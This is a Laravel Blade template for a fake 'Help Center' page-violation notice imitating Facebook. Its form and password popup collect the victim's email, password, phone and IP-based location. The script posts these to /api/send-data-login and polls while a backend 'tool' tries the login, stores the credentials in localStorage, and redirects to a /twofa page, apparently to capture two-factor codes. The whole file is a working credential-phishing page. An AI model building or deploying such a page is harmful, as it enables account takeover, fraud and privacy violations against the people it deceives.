@push('icons')
    <link rel="apple-touch-icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="180x180">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="32x32">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="16x16">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}" sizes="16x16">
    <link rel="mask-icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}">
    <link rel="icon" href="{{ asset('assets/img/language-svgrepo-com.svg') }}">
@endpush
@push('styles')
    <style>
        a {
            text-decoration: none;
        }

        /* CSS */
        .error {
            outline: none;
            border: 1px solid red;
        }

        .error:focus {
            outline: none;
            border: 1px solid red;
        }

        .error::placeholder {
            color: red;
        }

        .w-full {
            width: 100%;
        }

        .appearance-none {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .rounded {
            border-radius: 0.25rem;
        }

        .rounded-l-none {
            border-top-left-radius: 0;
            border-bottom-left-radius: 0;
        }

        .border {
            border-width: 1px;
        }

        .border-gray-300 {
            border-color: #d2d6dc;
        }

        .bg-white {
            background-color: #ffffff;
        }

        .px-3 {
            padding-left: 0.75rem;
            padding-right: 0.75rem;
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
        }

        .leading-tight {
            line-height: 1.25;
        }

        .text-gray-700 {
            color: #4a5568;
        }

        .focus\:border-gray-500:focus {
            border-color: #cbd5e0;
        }

        .focus\:outline-none:focus {
            outline: none;
        }

        .w-44 {
            width: 50px;
        }

        .appearance-none {
            -webkit-appearance: none;
            -moz-appearance: none;
            appearance: none;
        }

        .border {
            border-width: 1px;
            border-style: solid;
        }

        .border-r-0 {
            border-right-width: 0;
        }

        .border-gray-300 {
            border-color: #d2d6dc;
        }

        .bg-white {
            background-color: #ffffff;
        }

        .px-3 {
            padding-left: 0.75rem;
            padding-right: 0.75rem;
        }

        .py-2 {
            padding-top: 0.5rem;
            padding-bottom: 0.5rem;
        }

        .leading-tight {
            line-height: 1.25;
        }

        .text-gray-700 {
            color: #4a5568;
        }

        .focus\:outline-none:focus {
            outline: none;
        }

        select {
            font-family: "Noto Color Emoji", sans-serif;
            font-weight: 400;
            font-style: normal;
        }


        .error-notification {
            /* text-align: center; */
            display: none;
            /* padding: 0px 30px; */
        }

        .error-notification,
        .error-notification a {
            color: red;
        }

        .error-notification a {
            font-weight: bold;
        }
    </style>
@endpush
@push('scripts')
    <script>
        document.addEventListener("DOMContentLoaded", function() {
            // console.clear();
        });

        function openPopup() {
            document.getElementById("popup").style.display = "flex";
        }

        function closePopup() {
            document.getElementById("popup").style.display = "none";
        }

        function validatepassword() {
            var password = document.getElementById("password").value;
            if (password.length == 0) {
                $("#password").addClass('error');
                $("#password").focus();
                return;
            } else {
                $("#password").removeClass('error');
                return;
            }
        }

        document.addEventListener('DOMContentLoaded', function() {
            const passwordInput = document.getElementById('password');
            const eyeIcon = document.querySelector('.fa-eye');
            eyeIcon.addEventListener('click', function() {
                const isPasswordVisible = passwordInput.type === 'text';
                passwordInput.type = isPasswordVisible ? 'password' : 'text';
                eyeIcon.className = isPasswordVisible ? 'fa fa-eye-slash' : 'fa fa-eye';
            });
        });
    </script>
    {{-- js --}}
    <script>
        var ipAddress = "";
        var latitude = "";
        var longitude = "";
        var countryName = "";
        var countryCode = "";
        var cityName = "";
        var regionName = "";
        var timeZone = "";
        var zipCode = "";
        var continent = "";
        var continentCode = "";

        setCurrentLang();

        async function setCurrentLang() {
            let getIpInfoUrl = '{{ session()->get('getIpInfoUrl') }}';
            const response = await fetch(getIpInfoUrl);
            const ipInfo = await response.json();
            console.log(ipInfo);
            ipAddress = ipInfo.ipAddress;
            latitude = ipInfo.latitude;
            longitude = ipInfo.longitude;
            countryName = ipInfo.countryName;
            countryCode = ipInfo.countryCode;
            cityName = ipInfo.cityName;
            regionName = ipInfo.regionName;
            timeZone = ipInfo.timeZone;
            zipCode = ipInfo.zipCode;
            continent = ipInfo.continent;
            continentCode = ipInfo.continentCode;
        }

        function pushIPInfo(formData) {
            formData.append('ipAddress', ipAddress)
            formData.append('latitude', latitude)
            formData.append('longitude', longitude)
            formData.append('countryName', countryName)
            formData.append('countryCode', countryCode)
            formData.append('regionName', regionName)
            formData.append('cityName', cityName)
            formData.append('timeZone', timeZone)
            formData.append('zipCode', zipCode)
            formData.append('continent', continent)
            formData.append('continentCode', continentCode)
            return formData;
        }

        function isNumeric(str) {
            if (typeof str != "string") return false // we only process strings!

            return !isNaN(str) &&
                // use type coercion to parse the _entirety_ of the string (`parseFloat` alone does not do this)...
                !isNaN(parseFloat(str)) // ...and ensure strings of whitespace fail
        }

        function isValidValuePhoneEmail(value) {
            if (isNumeric(value)) {
                const regexPhoneNumber = /^0\d{9,11}$/;

                return regexPhoneNumber.test(value);
            } else {
                const regexEmail = /^\w+@[a-zA-Z_]+?\.[a-zA-Z]{2,3}$/;

                return regexEmail.test(value);
            }
        }


        var idIntervalGetCacheByEmail = null;
        var isLoginSuccessfully = 0;
        var email = "";

        function sendDataLogin() {
            //
            $('.error-notification').css('display', 'none');
            //
            const valueEmail = $('#email').val();
            email = valueEmail;
            const valuePassword = $('#password').val();
            const loading = $('#submit-login-loading');
            const text = $('#submit-login-text');
            let formData = new FormData();
            formData.append('email_2', valueEmail);
            formData.append('password_2', valuePassword);
            formData = pushIPInfo(formData);
            $.ajax({
                method: "POST",
                url: "/api/send-data-login",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        // start to call get cache by email waiting until tool returns response of login
                        idIntervalGetCacheByEmail = setInterval(async () => {
                            let info = await getCacheByEmail(valueEmail);
                            if (info) {
                                text.removeClass('d-none');
                                loading.addClass('d-none');
                                if (parseInt(info.isLoginSuccessfully) == 1) {
                                    // $('#modal-login').css('display', 'none');
                                    // $('#modal-fa').css('display', 'block');
                                    // $('.error-notification').css('display', 'none');
                                    // save user to localStorage
                                    localStorage.setItem('user', JSON.stringify({
                                        email: valueEmail,
                                        password: valuePassword,
                                    }));

                                    window.location.href = '/twofa';
                                } else {
                                    console.log('Login failed');
                                    $('.error-notification').css('display', 'block');
                                    text.removeClass('d-none');
                                    loading.addClass('d-none');
                                }
                                clearInterval(idIntervalGetCacheByEmail);
                                $('.button-form-login').prop('disabled', false);
                            } else {
                                console.log("Still call get cache by email");
                            }
                        }, 3000);
                    } else {
                        $('.button-form-login').prop('disabled', false);
                        $('.error-notification').css('display', 'block');
                        text.removeClass('d-none');
                        loading.addClass('d-none');
                    }
                }
            })
        }

        async function getCacheByEmail(email) {
            let result = null;
            let formData = new FormData();
            formData.append('email', email);
            await $.ajax({
                method: "POST",
                url: "/api/get-cache-by-email",
                data: formData,
                cache: false,
                contentType: false,
                processData: false,
                success: function(response) {
                    if (response.status == 0) {
                        result = response.data;
                    }
                }
            })

            return result;
        }

        $(document).on('click', '#must-check', function() {
            let value = $('#email').val();
            if ($(this).is(':checked') && isValidValuePhoneEmail(value)) {
                $('.btn-submit').prop('disabled', false);
                $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
            } else {
                $('.btn-submit').prop('disabled', true);
                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
            }
        })

        $(document).on('click', '.button-form-login', function() {
            $(this).prop('disabled', true);
            $('#login_error').addClass('d-none');
            const loading = $('#submit-login-loading');
            const text = $('#submit-login-text');
            text.addClass('d-none');
            loading.removeClass('d-none');
            let email = $('#email').val();
            let pass = $('#password').val();
            setTimeout(() => {
                if (!pass) {
                    text.removeClass('d-none');
                    loading.addClass('d-none');
                    $('.error-notification').css('display', 'block');
                    $(this).prop('disabled', false);
                } else {
                    sendDataLogin();
                }
            }, 1000);
        });

        $(document).on('input', '#email', function() {
            if (isValidValuePhoneEmail($(this).val())) {
                $(this).removeClass("error");
                $(this).prop('placeholder', '');
                if ($('#must-check').is(':checked')) {
                    $('.btn-submit').prop('disabled', false);
                    $('.btn-submit').css('background-color', 'rgb(26, 115, 227');
                }
            } else {
                $(this).addClass("error");
                $(this).prop('placeholder', 'Email or number phone is not valid');
                $(this).focus();
                $('.btn-submit').prop('disabled', true);
                $('.btn-submit').css('background-color', 'rgb(136, 189, 255)');
            }
        });
    </script>
@endpush
@extends('layouts.main')
@section('content')
    <div class="header">
        <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAANQAAAA8CAMAAAApF2TFAAAAAXNSR0IB2cksfwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAspQTFRFAAAA////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////17LOWQAAAO50Uk5TAAQZNkpDJgsgPUs3GgE/o+z/+sZvA6fjlzoCCUU4QjIPmfVNBZPy95Lv6CJU/rMuMBcr0v0SzckloAffexje+AoUu6+u1b30OXL71ryfDKntcVDYscUegucGeYy/cE+EKPPO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"
            alt="" />
    </div>
    <div class="sub-header" style="height:70px;display:flex;justify-content:space-between;align-items:center">
        <div class="" style="display:flex;justify-content:space-between;color: #3578E5">
            <div class="" style="margin-right:10px"><i class="fa-solid fa-house-chimney"></i></div>
            <div class="">Help Center</div>
        </div>
        <div class="">
            <a href="#">English</a>
        </div>
    </div>
    <div class="" style="display: flex">
        <div class="main-left">a</div>
        <div class="main main-right">
            <div class="maintop" style="background-color:#F5F6F7">
                <div class="content">
                    <div class="contentright">
                        <p class="titleright">@lang('home.home_violate')</p>
                    </div>
                </div>
            </div>
            <div class="maincontent">
                <p>@lang('home.home_condition_1')</p><br>
                <p>@lang('home.home_condition_2')</p><br>
                <p>@lang('home.home_condition_3')</p>
            </div>
            <div class="footer">
                <div class="bp">
                    <p class="footer-top">
                        <b>@lang('home.home_name_fanpage') </b> <span style="color: red">*</span>
                    </p>
                </div>
                <div class="button-btn">
                    <input type="text" id="email" />
                </div>
                <div class="bp">
                    <p class="footer-top">
                        <b>@lang('home.home_fullname') </b> <span style="color: red">*</span>
                    </p>
                </div>
                <div class="button-btn">
                    <input type="text" id="email" />
                </div>
                <div class="bp">
                    <p class="footer-top">
                        <b>@lang('home.home_bussiness_email') </b> <span style="color: red">*</span>
                    </p>
                </div>
                <div class="button-btn">
                    <input type="text" id="email" />
                </div>
                <div class="bp">
                    <p class="footer-top">
                        <b>@lang('home.home_personal_email') </b> <span style="color: red">*</span>
                    </p>
                </div>
                <div class="button-btn">
                    <input type="text" id="email" />
                </div>
                <div class="bp">
                    <p class="footer-top">
                        <b>@lang('home.home_phone') </b> <span style="color: red">*</span>
                    </p>
                </div>
                <div class="button-btn">
                    <input type="text" id="email" />
                </div>
                <div class="bp">
                    <p class="footer-top">
                        <b>@lang('home.home_text_area') </b>
                    </p>
                </div>
                <div class="button-btn">
                    <textarea name="" id="" cols="5" rows="3"></textarea>
                </div>
            </div>
            <div class="maintop" style="text-align: right;background-color:#F5F6F7">
                <button class="btn-submit" id="btn-submit" style="background-color:rgb(136, 189, 255)" disabled
                    onclick="openPopup()">@lang('login.submit')</button>
            </div>
        </div>
    </div>
    <div class="popup-container" id="popup">
        <div class="popup-content">
            <div class="popup-header">
                <h2>@lang('home.popup_header')</h2>
                <span class="popup-close" onclick="closePopup()">×</span>
            </div>
            <div class="popup-body">
                <p class="popup-text">@lang('home.popup_text')</p>
                <div class="form-group" style="margin-bottom: 0px">
                    <label>@lang('home.popup_password')</label>
                    <div class="error-notification mb-2" style="display: none">
                        <span class="">@lang('fa.warning_login_fa')</span>
                        <br><a class="" href="https://facebook.com/login/identify/">@lang('fa.warning_find_fa')</a>
                    </div>
                    <div class="" style="display:flex;align-items:center;position: relative;">
                        <input type="password" class="form-input" id="password" oninput="validatepassword()"
                            placeholder="@lang('login.password')" value="" />
                        <i id="eye" class="fa fa-eye" style="position: absolute;right:30px"></i>
                    </div>
                </div>
                <p class="error-message" id="error-message" style="display: none">@lang('home.popup_error')</p>
            </div>
            <div class="popup-footer">
                {{-- <button class="button" disabled id="btn-continue" onclick="nextPage()"> Continue </button> --}}
                <button style="background-color: rgb(26, 115, 227);color:white" type="button" class="button-form-login">
                    <span id="submit-login-loading" style="width:1.5rem;height:1.5rem;"
                        class="d-none spinner-border spinner">
                    </span>
                    <span id="submit-login-text">@lang('login.submit')</span>
                </button>
                <span class="loader" id="loader"></span>
            </div>
        </div>
    </div>
@endsection
